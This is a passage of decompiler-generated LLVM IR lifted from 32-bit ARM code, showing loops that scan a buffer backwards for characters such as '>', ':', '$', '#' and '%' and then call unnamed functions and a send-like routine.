  br label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_11760, %dec_label_pc_10dbc
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_113bc, %dec_label_pc_112c4, %dec_label_pc_111f0, %dec_label_pc_1111c, %dec_label_pc_10f44, %dec_label_pc_10e70, %dec_label_pc_10dc8
  %v0_10dcc = load i32, i32* @r6, align 4
  %v1_10dcc = add i32 %v0_10dcc, 24
  %v2_10dcc = inttoptr i32 %v1_10dcc to i32*
  %v3_10dcc = load i32, i32* %v2_10dcc, align 4
  %v0_10dd0 = load i32, i32* @r7, align 4
  %v2_10dd0 = sub i32 %v0_10dd0, %v3_10dcc
  %v3_10dd0 = icmp uge i32 %v0_10dd0, %v3_10dcc
  store i1 %v3_10dd0, i1* %cpsr_c.global-to-local, align 1
  %v4_10dd0 = xor i32 %v0_10dd0, %v3_10dcc
  %v5_10dd0 = xor i32 %v2_10dd0, %v0_10dd0
  %v6_10dd0 = and i32 %v5_10dd0, %v4_10dd0
  %v7_10dd0 = icmp slt i32 %v6_10dd0, 0
  %v8_10dd0 = icmp slt i32 %v2_10dd0, 0
  %v9_10dd0 = icmp eq i32 %v0_10dd0, %v3_10dcc
  store i1 %v9_10dd0, i1* %cpsr_z.global-to-local, align 1
  %v2_10dd4 = xor i1 %v8_10dd0, %v7_10dd0
  %v0_10dd0.v3_10dcc = select i1 %v2_10dd4, i32 %v0_10dd0, i32 %v3_10dcc
  store i32 %v0_10dd0.v3_10dcc, i32* %r1.global-to-local, align 4
  %v2_10ddc = sub i32 %v3_10dcc, %v0_10dd0.v3_10dcc
  store i32 %v2_10ddc, i32* %r2.global-to-local, align 4
  store i32 %v2_10ddc, i32* %v2_10dcc, align 4
  %v0_10de4 = load i32, i32* @fp, align 4
  %v1_10de4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10de4 = add i32 %v1_10de4, %v0_10de4
  store i32 %v2_10de4, i32* %r1.global-to-local, align 4
  store i32 %v0_10de4, i32* %r0.global-to-local, align 4
  %v3_10dec = inttoptr i32 %v0_10de4 to i8*
  %v4_10dec = call i32 @function_153fc(i8* %v3_10dec, i32 %v2_10de4, i32 %v2_10ddc)
  store i32 %v4_10dec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c9c

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10c9c
  %v1_10df4 = add i32 %v0_10c9c, 24
  %v2_10df4 = inttoptr i32 %v1_10df4 to i32*
  %v3_10df4 = load i32, i32* %v2_10df4, align 4
  store i32 %v3_10df4, i32* %r2.global-to-local, align 4
  %v1_10df8 = add i32 %v3_10df4, -1
  store i32 %v1_10df8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dfc = icmp eq i32 %v1_10df8, 0
  store i1 %v2_10dfc, i1* %cpsr_z.global-to-local, align 1
  %tmp349 = icmp slt i32 %v1_10df8, 1
  br i1 %tmp349, label %dec_label_pc_10c1cthread-pre-split.thread, label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10df4
  %v2_10e04 = add i32 %v1_10df8, %v0_10c9c
  store i32 %v2_10e04, i32* %r3.global-to-local, align 4
  %v1_10e08 = add i32 %v2_10e04, 28
  %v2_10e08 = inttoptr i32 %v1_10e08 to i8*
  %v3_10e08 = load i8, i8* %v2_10e08, align 1
  %v4_10e08 = zext i8 %v3_10e08 to i32
  store i32 %v4_10e08, i32* %r3.global-to-local, align 4
  %v2_10e0c = icmp ugt i8 %v3_10e08, 61
  store i1 %v2_10e0c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e0c = icmp eq i8 %v3_10e08, 62
  store i1 %v7_10e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e0c, label %dec_label_pc_10e70, label %bb350

bb350:                                            ; preds = %dec_label_pc_10e04
  %v3_10e10 = icmp ugt i8 %v3_10e08, 57
  store i1 %v3_10e10, i1* %cpsr_c.global-to-local, align 1
  %v8_10e10 = icmp eq i8 %v3_10e08, 58
  store i1 %v8_10e10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e10, label %dec_label_pc_10e70, label %dec_label_pc_10e18

dec_label_pc_10e18:                               ; preds = %bb350
  %v2_10e18 = icmp ugt i8 %v3_10e08, 35
  store i1 %v2_10e18, i1* %cpsr_c.global-to-local, align 1
  %v7_10e18 = icmp eq i8 %v3_10e08, 36
  store i1 %v7_10e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e18, label %dec_label_pc_10e70, label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10e18
  %v2_10e20 = icmp ugt i8 %v3_10e08, 34
  store i1 %v2_10e20, i1* %cpsr_c.global-to-local, align 1
  %v7_10e20 = icmp eq i8 %v3_10e08, 35
  store i1 %v7_10e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e20, label %dec_label_pc_10e70, label %dec_label_pc_10e28

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e20
  %v2_10e28 = icmp ugt i8 %v3_10e08, 36
  store i1 %v2_10e28, i1* %cpsr_c.global-to-local, align 1
  %v7_10e28 = icmp eq i8 %v3_10e08, 37
  store i1 %v7_10e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e28, label %dec_label_pc_10e70, label %dec_label_pc_10e58.preheader

dec_label_pc_10e58.preheader:                     ; preds = %dec_label_pc_10e28
  %v3_10e2c = add i32 %v0_10c9c, 28
  %v2_10e30 = add i32 %v3_10e2c, %v3_10df4
  store i32 %v2_10e30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10e58

dec_label_pc_10e3c:                               ; preds = %bb351
  %v2_10e3c = icmp ugt i8 %v3_10e60, 35
  store i1 %v2_10e3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e3c = icmp eq i8 %v3_10e60, 36
  store i1 %v7_10e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e3c, label %dec_label_pc_10e70, label %dec_label_pc_10e44

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e3c
  %v2_10e44 = icmp ugt i8 %v3_10e60, 34
  store i1 %v2_10e44, i1* %cpsr_c.global-to-local, align 1
  %v7_10e44 = icmp eq i8 %v3_10e60, 35
  store i1 %v7_10e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e44, label %dec_label_pc_10e70, label %dec_label_pc_10e4c

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e44
  %v2_10e4c = icmp ugt i8 %v3_10e60, 36
  store i1 %v2_10e4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e4c = icmp eq i8 %v3_10e60, 37
  store i1 %v7_10e4c, i1* %cpsr_z.global-to-local, align 1
  %v1_10e50 = add i32 %v0_10e50, -1
  store i32 %v1_10e50, i32* %r3.global-to-local, align 4
  br i1 %v7_10e4c, label %dec_label_pc_10e70, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e58.preheader, %dec_label_pc_10e4c
  %v0_10e50 = phi i32 [ %v2_10e30, %dec_label_pc_10e58.preheader ], [ %v1_10e50, %dec_label_pc_10e4c ]
  %v0_10e58 = phi i32 [ %v1_10df8, %dec_label_pc_10e58.preheader ], [ %v1_10e58, %dec_label_pc_10e4c ]
  %v1_10e58 = add i32 %v0_10e58, -1
  store i32 %v1_10e58, i32* %r1.global-to-local, align 4
  %v2_10e58 = icmp ne i32 %v0_10e58, 0
  store i1 %v2_10e58, i1* %cpsr_c.global-to-local, align 1
  %v7_10e58 = icmp eq i32 %v0_10e58, 1
  store i1 %v7_10e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e58, label %dec_label_pc_10c1cthread-pre-split.thread477, label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e58
  %v1_10e60 = add i32 %v0_10e50, -2
  %v2_10e60 = inttoptr i32 %v1_10e60 to i8*
  %v3_10e60 = load i8, i8* %v2_10e60, align 1
  %v4_10e60 = zext i8 %v3_10e60 to i32
  store i32 %v4_10e60, i32* %r2.global-to-local, align 4
  %v2_10e64 = icmp ugt i8 %v3_10e60, 61
  store i1 %v2_10e64, i1* %cpsr_c.global-to-local, align 1
  %v7_10e64 = icmp eq i8 %v3_10e60, 62
  store i1 %v7_10e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e64, label %dec_label_pc_10e70, label %bb351

bb351:                                            ; preds = %dec_label_pc_10e60
  %v3_10e68 = icmp ugt i8 %v3_10e60, 57
  store i1 %v3_10e68, i1* %cpsr_c.global-to-local, align 1
  %v8_10e68 = icmp eq i8 %v3_10e60, 58
  store i1 %v8_10e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e68, label %dec_label_pc_10e70, label %dec_label_pc_10e3c

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e60, %bb351, %dec_label_pc_10e4c, %dec_label_pc_10e44, %dec_label_pc_10e3c, %dec_label_pc_10e28, %dec_label_pc_10e04, %dec_label_pc_10e20, %dec_label_pc_10e18, %bb350
  %v0_10e74 = phi i32 [ %v1_10df8, %dec_label_pc_10e28 ], [ %v1_10df8, %dec_label_pc_10e04 ], [ %v1_10df8, %dec_label_pc_10e20 ], [ %v1_10df8, %dec_label_pc_10e18 ], [ %v1_10df8, %bb350 ], [ %v1_10e58, %dec_label_pc_10e3c ], [ %v1_10e58, %dec_label_pc_10e44 ], [ %v1_10e58, %dec_label_pc_10e4c ], [ %v1_10e58, %bb351 ], [ %v1_10e58, %dec_label_pc_10e60 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10e74 = add i32 %v0_10e74, 1
  store i32 %v1_10e74, i32* @r7, align 4
  %v1_10e78 = call i32 @function_11a94(i32 24)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10e88 = call i32 @function_119d0(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10e88, i32* %r0.global-to-local, align 4
  %v3_10e8c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10e8c, i32* @r2, align 4
  store i32 %v3_10e88, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10e98 = load i32, i32* @r6, align 4
  %v1_10e98 = add i32 %v0_10e98, 4
  %v2_10e98 = inttoptr i32 %v1_10e98 to i32*
  %v3_10e98 = load i32, i32* %v2_10e98, align 4
  store i32 %v3_10e98, i32* @r0, align 4
  %v4_10e9c = call i32 @function_14a74(i32 %v3_10e98, i32 %v3_10e88, i32 %v3_10e8c, i32 16384)
  store i32 %v4_10e9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10eac = load i32, i32* @r6, align 4
  %v1_10eac = add i32 %v0_10eac, 4
  %v2_10eac = inttoptr i32 %v1_10eac to i32*
  %v3_10eac = load i32, i32* %v2_10eac, align 4
  store i32 %v3_10eac, i32* @r0, align 4
  %v4_10eb0 = call i32 @function_14a74(i32 %v3_10eac, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10eb8 = call i32 @function_119f4(i32 24)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10ec0 = load i32, i32* @r6, align 4
  %v2_10ec0 = add i32 %v1_10ec0, 12
  %v3_10ec0 = inttoptr i32 %v2_10ec0 to i32*
  store i32 10, i32* %v3_10ec0, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10c9c
  %v1_10ec8 = add i32 %v0_10c9c, 24
  %v2_10ec8 = inttoptr i32 %v1_10ec8 to i32*
  %v3_10ec8 = load i32, i32* %v2_10ec8, align 4
  store i32 %v3_10ec8, i32* %r2.global-to-local, align 4
  %v1_10ecc = add i32 %v3_10ec8, -1
  store i32 %v1_10ecc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ed0 = icmp eq i32 %v1_10ecc, 0
  store i1 %v2_10ed0, i1* %cpsr_z.global-to-local, align 1
  %tmp352 = icmp slt i32 %v1_10ecc, 1
  br i1 %tmp352, label %dec_label_pc_10c1cthread-pre-split.thread, label %dec_label_pc_10ed8

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10ec8
  %v2_10ed8 = add i32 %v1_10ecc, %v0_10c9c
  store i32 %v2_10ed8, i32* %r3.global-to-local, align 4
  %v1_10edc = add i32 %v2_10ed8, 28
  %v2_10edc = inttoptr i32 %v1_10edc to i8*
  %v3_10edc = load i8, i8* %v2_10edc, align 1
  %v4_10edc = zext i8 %v3_10edc to i32
  store i32 %v4_10edc, i32* %r3.global-to-local, align 4
  %v2_10ee0 = icmp ugt i8 %v3_10edc, 61
  store i1 %v2_10ee0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ee0 = icmp eq i8 %v3_10edc, 62
  store i1 %v7_10ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ee0, label %dec_label_pc_10f44, label %bb353

bb353:                                            ; preds = %dec_label_pc_10ed8
  %v3_10ee4 = icmp ugt i8 %v3_10edc, 57
  store i1 %v3_10ee4, i1* %cpsr_c.global-to-local, align 1
  %v8_10ee4 = icmp eq i8 %v3_10edc, 58
  store i1 %v8_10ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ee4, label %dec_label_pc_10f44, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %bb353
  %v2_10eec = icmp ugt i8 %v3_10edc, 35
  store i1 %v2_10eec, i1* %cpsr_c.global-to-local, align 1
  %v7_10eec = icmp eq i8 %v3_10edc, 36
  store i1 %v7_10eec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eec, label %dec_label_pc_10f44, label %dec_label_pc_10ef4

dec_label_pc_10ef4:                               ; preds = %dec_label_pc_10eec
  %v2_10ef4 = icmp ugt i8 %v3_10edc, 34
  store i1 %v2_10ef4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef4 = icmp eq i8 %v3_10edc, 35
  store i1 %v7_10ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef4, label %dec_label_pc_10f44, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10ef4
  %v2_10efc = icmp ugt i8 %v3_10edc, 36
  store i1 %v2_10efc, i1* %cpsr_c.global-to-local, align 1
  %v7_10efc = icmp eq i8 %v3_10edc, 37
  store i1 %v7_10efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10efc, label %dec_label_pc_10f44, label %dec_label_pc_10f2c.preheader

dec_label_pc_10f2c.preheader:                     ; preds = %dec_label_pc_10efc
  %v3_10f00 = add i32 %v0_10c9c, 28
  %v2_10f04 = add i32 %v3_10f00, %v3_10ec8
  store i32 %v2_10f04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f2c

dec_label_pc_10f10:                               ; preds = %bb354
  %v2_10f10 = icmp ugt i8 %v3_10f34, 35
  store i1 %v2_10f10, i1* %cpsr_c.global-to-local, align 1
  %v7_10f10 = icmp eq i8 %v3_10f34, 36
  store i1 %v7_10f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f10, label %dec_label_pc_10f44, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f10
  %v2_10f18 = icmp ugt i8 %v3_10f34, 34
  store i1 %v2_10f18, i1* %cpsr_c.global-to-local, align 1
  %v7_10f18 = icmp eq i8 %v3_10f34, 35
  store i1 %v7_10f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f18, label %dec_label_pc_10f44, label %dec_label_pc_10f20

dec_label_pc_10f20:                               ; preds = %dec_label_pc_10f18
  %v2_10f20 = icmp ugt i8 %v3_10f34, 36
  store i1 %v2_10f20, i1* %cpsr_c.global-to-local, align 1
  %v7_10f20 = icmp eq i8 %v3_10f34, 37
  store i1 %v7_10f20, i1* %cpsr_z.global-to-local, align 1
  %v1_10f24 = add i32 %v0_10f24, -1
  store i32 %v1_10f24, i32* %r3.global-to-local, align 4
  br i1 %v7_10f20, label %dec_label_pc_10f44, label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f2c.preheader, %dec_label_pc_10f20
  %v0_10f24 = phi i32 [ %v2_10f04, %dec_label_pc_10f2c.preheader ], [ %v1_10f24, %dec_label_pc_10f20 ]
  %v0_10f2c = phi i32 [ %v1_10ecc, %dec_label_pc_10f2c.preheader ], [ %v1_10f2c, %dec_label_pc_10f20 ]
  %v1_10f2c = add i32 %v0_10f2c, -1
  store i32 %v1_10f2c, i32* %r1.global-to-local, align 4
  %v2_10f2c = icmp ne i32 %v0_10f2c, 0
  store i1 %v2_10f2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f2c = icmp eq i32 %v0_10f2c, 1
  store i1 %v7_10f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f2c, label %dec_label_pc_10c1cthread-pre-split.thread477, label %dec_label_pc_10f34

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f2c
  %v1_10f34 = add i32 %v0_10f24, -2
  %v2_10f34 = inttoptr i32 %v1_10f34 to i8*
  %v3_10f34 = load i8, i8* %v2_10f34, align 1
  %v4_10f34 = zext i8 %v3_10f34 to i32
  store i32 %v4_10f34, i32* %r2.global-to-local, align 4
  %v2_10f38 = icmp ugt i8 %v3_10f34, 61
  store i1 %v2_10f38, i1* %cpsr_c.global-to-local, align 1
  %v7_10f38 = icmp eq i8 %v3_10f34, 62
  store i1 %v7_10f38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f38, label %dec_label_pc_10f44, label %bb354

bb354:                                            ; preds = %dec_label_pc_10f34
  %v3_10f3c = icmp ugt i8 %v3_10f34, 57
  store i1 %v3_10f3c, i1* %cpsr_c.global-to-local, align 1
  %v8_10f3c = icmp eq i8 %v3_10f34, 58
  store i1 %v8_10f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f3c, label %dec_label_pc_10f44, label %dec_label_pc_10f10

dec_label_pc_10f44:                               ; preds = %dec_label_pc_10f34, %bb354, %dec_label_pc_10f20, %dec_label_pc_10f18, %dec_label_pc_10f10, %dec_label_pc_10efc, %dec_label_pc_10ed8, %dec_label_pc_10ef4, %dec_label_pc_10eec, %bb353
  %v0_10f48 = phi i32 [ %v1_10ecc, %dec_label_pc_10efc ], [ %v1_10ecc, %dec_label_pc_10ed8 ], [ %v1_10ecc, %dec_label_pc_10ef4 ], [ %v1_10ecc, %dec_label_pc_10eec ], [ %v1_10ecc, %bb353 ], [ %v1_10f2c, %dec_label_pc_10f10 ], [ %v1_10f2c, %dec_label_pc_10f18 ], [ %v1_10f2c, %dec_label_pc_10f20 ], [ %v1_10f2c, %bb354 ], [ %v1_10f2c, %dec_label_pc_10f34 ]
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10f48 = add i32 %v0_10f48, 1
  store i32 %v1_10f48, i32* @r7, align 4
  %v1_10f4c = call i32 @function_11a94(i32 20)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_10f5c = call i32 @function_119d0(i32 20, i32* nonnull %stack_var_-60)
  store i32 %v3_10f5c, i32* %r0.global-to-local, align 4
  %v3_10f60 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10f60, i32* @r2, align 4
  store i32 %v3_10f5c, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f6c = load i32, i32* @r6, align 4
  %v1_10f6c = add i32 %v0_10f6c, 4
  %v2_10f6c = inttoptr i32 %v1_10f6c to i32*
  %v3_10f6c = load i32, i32* %v2_10f6c, align 4
  store i32 %v3_10f6c, i32* @r0, align 4
  %v4_10f70 = call i32 @function_14a74(i32 %v3_10f6c, i32 %v3_10f5c, i32 %v3_10f60, i32 16384)
  store i32 %v4_10f70, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f80 = load i32, i32* @r6, align 4
  %v1_10f80 = add i32 %v0_10f80, 4
  %v2_10f80 = inttoptr i32 %v1_10f80 to i32*
  %v3_10f80 = load i32, i32* %v2_10f80, align 4
  store i32 %v3_10f80, i32* @r0, align 4
  %v4_10f84 = call i32 @function_14a74(i32 %v3_10f80, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10f8c = call i32 @function_119f4(i32 20)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10f94 = load i32, i32* @r6, align 4
  %v2_10f94 = add i32 %v1_10f94, 12
  %v3_10f94 = inttoptr i32 %v2_10f94 to i32*
  store i32 8, i32* %v3_10f94, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10c9c
  %v1_10f9c = add i32 %v0_10c9c, 24
  %v2_10f9c = inttoptr i32 %v1_10f9c to i32*
  %v3_10f9c = load i32, i32* %v2_10f9c, align 4
  store i32 %v3_10f9c, i32* %r2.global-to-local, align 4
  %v1_10fa0 = add i32 %v3_10f9c, -1
  store i32 %v1_10fa0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10fa4 = icmp eq i32 %v1_10fa0, 0
  store i1 %v2_10fa4, i1* %cpsr_z.global-to-local, align 1
  %tmp355 = icmp slt i32 %v1_10fa0, 1
  br i1 %tmp355, label %dec_label_pc_10c1cthread-pre-split.thread, label %dec_label_pc_10fac

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10f9c
  %v2_10fac = add i32 %v1_10fa0, %v0_10c9c
  store i32 %v2_10fac, i32* %r3.global-to-local, align 4
  %v1_10fb0 = add i32 %v2_10fac, 28
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i8*
  %v3_10fb0 = load i8, i8* %v2_10fb0, align 1
  %v4_10fb0 = zext i8 %v3_10fb0 to i32
  store i32 %v4_10fb0, i32* %r3.global-to-local, align 4
  %v2_10fb4 = icmp ugt i8 %v3_10fb0, 61
  store i1 %v2_10fb4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb4 = icmp eq i8 %v3_10fb0, 62
  store i1 %v7_10fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb4, label %dec_label_pc_1111c, label %bb356

bb356:                                            ; preds = %dec_label_pc_10fac
  %v3_10fb8 = icmp ugt i8 %v3_10fb0, 57
  store i1 %v3_10fb8, i1* %cpsr_c.global-to-local, align 1
  %v8_10fb8 = icmp eq i8 %v3_10fb0, 58
  store i1 %v8_10fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fb8, label %dec_label_pc_1111c, label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %bb356
  %v2_10fc0 = icmp ugt i8 %v3_10fb0, 35
  store i1 %v2_10fc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc0 = icmp eq i8 %v3_10fb0, 36
  store i1 %v7_10fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc0, label %dec_label_pc_1111c, label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %dec_label_pc_10fc0
  %v2_10fc8 = icmp ugt i8 %v3_10fb0, 34
  store i1 %v2_10fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc8 = icmp eq i8 %v3_10fb0, 35
  store i1 %v7_10fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc8, label %dec_label_pc_1111c, label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10fc8
  %v2_10fd0 = icmp ugt i8 %v3_10fb0, 36
  store i1 %v2_10fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd0 = icmp eq i8 %v3_10fb0, 37
  store i1 %v7_10fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd0, label %dec_label_pc_1111c, label %dec_label_pc_11104.preheader

dec_label_pc_11104.preheader:                     ; preds = %dec_label_pc_10fd0
  %v3_10fd4 = add i32 %v0_10c9c, 28
  %v2_10fd8 = add i32 %v3_10fd4, %v3_10f9c
  store i32 %v2_10fd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11104

dec_label_pc_110e8:                               ; preds = %bb357
  %v2_110e8 = icmp ugt i8 %v3_1110c, 35
  store i1 %v2_110e8, i1* %cpsr_c.global-to-local, align 1
  %v7_110e8 = icmp eq i8 %v3_1110c, 36
  store i1 %v7_110e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110e8, label %dec_label_pc_1111c, label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110e8
  %v2_110f0 = icmp ugt i8 %v3_1110c, 34
  store i1 %v2_110f0, i1* %cpsr_c.global-to-local, align 1
  %v7_110f0 = icmp eq i8 %v3_1110c, 35
  store i1 %v7_110f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110f0, label %dec_label_pc_1111c, label %dec_label_pc_110f8

dec_label_pc_110f8:                               ; preds = %dec_label_pc_110f0
  %v2_110f8 = icmp ugt i8 %v3_1110c, 36
  store i1 %v2_110f8, i1* %cpsr_c.global-to-local, align 1
  %v7_110f8 = icmp eq i8 %v3_1110c, 37
  store i1 %v7_110f8, i1* %cpsr_z.global-to-local, align 1
  %v1_110fc = add i32 %v0_110fc, -1
  store i32 %v1_110fc, i32* %r3.global-to-local, align 4
  br i1 %v7_110f8, label %dec_label_pc_1111c, label %dec_label_pc_11104

dec_label_pc_11104:                               ; preds = %dec_label_pc_11104.preheader, %dec_label_pc_110f8
  %v0_110fc = phi i32 [ %v2_10fd8, %dec_label_pc_11104.preheader ], [ %v1_110fc, %dec_label_pc_110f8 ]
  %v0_11104 = phi i32 [ %v1_10fa0, %dec_label_pc_11104.preheader ], [ %v1_11104, %dec_label_pc_110f8 ]
  %v1_11104 = add i32 %v0_11104, -1
  store i32 %v1_11104, i32* %r1.global-to-local, align 4
  %v2_11104 = icmp ne i32 %v0_11104, 0
  store i1 %v2_11104, i1* %cpsr_c.global-to-local, align 1
  %v7_11104 = icmp eq i32 %v0_11104, 1
  store i1 %v7_11104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11104, label %dec_label_pc_10c1cthread-pre-split.thread477, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %dec_label_pc_11104
  %v1_1110c = add i32 %v0_110fc, -2
  %v2_1110c = inttoptr i32 %v1_1110c to i8*
  %v3_1110c = load i8, i8* %v2_1110c, align 1
  %v4_1110c = zext i8 %v3_1110c to i32
  store i32 %v4_1110c, i32* %r2.global-to-local, align 4
  %v2_11110 = icmp ugt i8 %v3_1110c, 61
  store i1 %v2_11110, i1* %cpsr_c.global-to-local, align 1
  %v7_11110 = icmp eq i8 %v3_1110c, 62
  store i1 %v7_11110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11110, label %dec_label_pc_1111c, label %bb357

bb357:                                            ; preds = %dec_label_pc_1110c
  %v3_11114 = icmp ugt i8 %v3_1110c, 57
  store i1 %v3_11114, i1* %cpsr_c.global-to-local, align 1
  %v8_11114 = icmp eq i8 %v3_1110c, 58
  store i1 %v8_11114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11114, label %dec_label_pc_1111c, label %dec_label_pc_110e8

dec_label_pc_1111c:                               ; preds = %dec_label_pc_1110c, %bb357, %dec_label_pc_110f8, %dec_label_pc_110f0, %dec_label_pc_110e8, %dec_label_pc_10fd0, %dec_label_pc_10fac, %dec_label_pc_10fc8, %dec_label_pc_10fc0, %bb356
  %v0_11120 = phi i32 [ %v1_10fa0, %dec_label_pc_10fd0 ], [ %v1_10fa0, %dec_label_pc_10fac ], [ %v1_10fa0, %dec_label_pc_10fc8 ], [ %v1_10fa0, %dec_label_pc_10fc0 ], [ %v1_10fa0, %bb356 ], [ %v1_11104, %dec_label_pc_110e8 ], [ %v1_11104, %dec_label_pc_110f0 ], [ %v1_11104, %dec_label_pc_110f8 ], [ %v1_11104, %bb357 ], [ %v1_11104, %dec_label_pc_1110c ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11120 = add i32 %v0_11120, 1
  store i32 %v1_11120, i32* @r7, align 4
  %v1_11124 = call i32 @function_11a94(i32 22)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_11134 = call i32 @function_119d0(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_11134, i32* %r0.global-to-local, align 4
  %v3_11138 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11138, i32* @r2, align 4
  store i32 %v3_11134, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11144 = load i32, i32* @r6, align 4
  %v1_11144 = add i32 %v0_11144, 4
  %v2_11144 = inttoptr i32 %v1_11144 to i32*
  %v3_11144 = load i32, i32* %v2_11144, align 4
  store i32 %v3_11144, i32* @r0, align 4
  %v4_11148 = call i32 @function_14a74(i32 %v3_11144, i32 %v3_11134, i32 %v3_11138, i32 16384)
  store i32 %v4_11148, i32* %r0.global-to-local, align 4
